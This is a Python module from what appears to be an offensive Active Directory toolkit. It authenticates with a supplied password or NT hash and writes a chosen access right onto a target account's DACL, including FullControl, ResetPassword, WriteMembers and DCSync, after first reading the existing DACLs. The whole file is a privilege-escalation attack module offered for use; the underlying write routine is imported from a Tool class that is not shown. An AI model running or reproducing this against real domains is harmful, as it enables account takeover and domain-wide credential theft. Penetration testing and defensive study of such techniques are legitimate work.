import os

from tool import Tool
from module import BaseModule


class WriteDacl(BaseModule):
    path = "acl/writedacl"
    description = "Write a configurable DACL right on the target. Requires WriteDacl."
    options = {
        "dc_ip": {
            "default": "",
            "description": "Domain Controller IP or host address. If empty. domain will be used.",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Auth: Domain name (FQDN)",
            "required": True,
        },
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {
            "default": "",
            "description": "Auth: Password or NT Hash (for NTLM auth only)",
            "required": False,
        },
        "auth": {
            "default": "ntlm",
            "description": "Auth: Type (ntlm, krb)",
            "required": True,
        },
        "target_account": {
            "default": "",
            "description": "Target account",
            "required": True,
        },
        "dacl_type": {
            "default": "FullControl",
            "description": "DACL right to write (WriteDACL, FullControl, ResetPassword, WriteMembers, DCSync)",
            "required": False,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def _run(self, opts, pane):

        os.chdir(self.logs_dir)

        tool = Tool(self)
        tool.set_output_pane(pane)
        if not tool.set_auth(from_module=True):
            return

        dacl_type = (opts.dacl_type or "FullControl").strip()
        if not dacl_type:
            self.pane_a.write("[red][!] Option `dacl_type` cannot be empty.[/red]")
            return
        valid_dacl_types = {
            "WriteDACL",
            "FullControl",
            "ResetPassword",
            "WriteMembers",
            "DCSync",
        }
        if dacl_type not in valid_dacl_types:
            self.pane_a.write(
                "[red][!] Option `dacl_type` must be one of: "
                + ", ".join(sorted(valid_dacl_types))
                + ".[/red]"
            )
            return

        tool.title("Read existing DACLs for target")
        dacls = await tool.read_dacl(opts.target_account)
        if dacls is False:
            return

        if dacl_type not in dacls:
            tool.title(f"Adding {dacl_type} DACL to target")
            if not await tool.write_dacl(opts.target_account, dacl_type):
                return

    async def run(self):
        if not self.validate_options():
            return

        await self._run(self.opts, self.pane_b)
